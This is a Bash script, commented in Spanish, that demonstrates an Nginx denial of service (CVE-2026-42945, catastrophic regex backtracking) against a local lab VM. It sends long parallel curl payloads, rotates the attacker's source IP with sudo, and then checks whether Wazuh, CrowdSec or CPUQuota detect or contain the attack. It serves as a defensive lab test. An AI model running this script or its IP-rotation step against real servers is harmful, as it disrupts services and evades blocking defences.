#!/bin/bash
# Demo CVE-2026-42945 — Nginx DoS via Catastrophic Backtracking
# VERSIÓN: Autónoma, Rotación de IP Dinámica, Portátil.

echo "[*] Preparando entorno de ataque dinámico..."

# 1. Obtener la IP actual de la VM de Multipass
VM_IP=$(multipass info tid-lab | awk '/IPv4/ {print $2}' | head -n 1)
if [ -z "$VM_IP" ]; then
    echo "[-] Error: No se pudo obtener la IP de tid-lab. ¿Está encendida?"
    exit 1
fi
TARGET="$VM_IP"

# 2. Identificar la interfaz del host y el rango de red
ROUTE_INFO=$(ip route get "$TARGET")
HOST_IFACE=$(echo "$ROUTE_INFO" | grep -oP 'dev \K\S+')
BASE_IP=$(echo "$TARGET" | cut -d. -f1-3)

# 3. Limpiar IPs secundarias anteriores (Atacantes viejos)
# Buscamos IPs en esa interfaz que no sean la IP principal (.1)
OLD_IPS=$(ip -4 addr show dev "$HOST_IFACE" | grep inet | awk '{print $2}' | grep "^${BASE_IP}" | grep -v "${BASE_IP}.1/")
for old_ip in $OLD_IPS; do
    echo "[*] Limpiando IP de ataque anterior: $old_ip"
    sudo ip addr del "$old_ip" dev "$HOST_IFACE" 2>/dev/null
done

# 4. Generar y asignar una NUEVA IP de atacante (entre .100 y .200)
NEW_OCTET=$((RANDOM % 100 + 100))
ATTACK_IP="${BASE_IP}.${NEW_OCTET}"

echo "[*] Asignando nueva IP de atacante rotada: ${ATTACK_IP} en interfaz ${HOST_IFACE}..."
sudo ip addr add "${ATTACK_IP}/24" dev "$HOST_IFACE"

# Pausa breve para que la red asiente la IP
sleep 1

echo "==========================================================="
echo "[*] Iniciando ataque Catastrophic Backtracking sobre Nginx"
echo "[*] Objetivo: ${TARGET}"
echo "[*] Origen (Atacante): ${ATTACK_IP}"
echo "==========================================================="

echo "[*] Inyectando payloads pesados al endpoint vulnerable /app/"
# Payload largo para el rewrite rule vulnerable de Nginx:
PAYLOAD=$(python3 -c "print('A'*2000 + '/' + 'B'*2000)")

for i in {1..10}; do
    curl --interface "${ATTACK_IP}" -s -o /dev/null --max-time 2 "http://${TARGET}/app/${PAYLOAD}" &
done
wait

echo "[*] Payloads de backtracking enviados..."

echo "[*] Inyectando tráfico 404 anómalo para alertas de Wazuh y CrowdSec..."
for i in {1..40}; do
    curl --interface "${ATTACK_IP}" -s -o /dev/null --max-time 2 "http://${TARGET}/vuln-trigger-${i}" &
    curl --interface "${ATTACK_IP}" -s -o /dev/null --max-time 2 "http://${TARGET}/exploit-probe-${i}" &
done
wait

echo "[!] Ataque completado. Verificando estado del servicio Nginx..."
echo "[*] Esperando 3 segundos a que CrowdSec aplique el bloqueo perimetral..."
sleep 3

HTTP_STATUS=$(curl --interface "${ATTACK_IP}" -s -o /dev/null -w "%{http_code}" --max-time 3 "http://${TARGET}/")
if [ "$HTTP_STATUS" = "200" ]; then
    echo "[+] Nginx sigue respondiendo (HTTP $HTTP_STATUS) — CPUQuota contención exitosa"
elif [ "$HTTP_STATUS" = "000" ]; then
    echo "[-] Nginx no responde (Timeout 000) — ¡CROWDSEC TE HA BLOQUEADO EXITOSAMENTE LA IP ${ATTACK_IP}!"
else
    echo "[-] Nginx devolvió código: HTTP $HTTP_STATUS"
fi
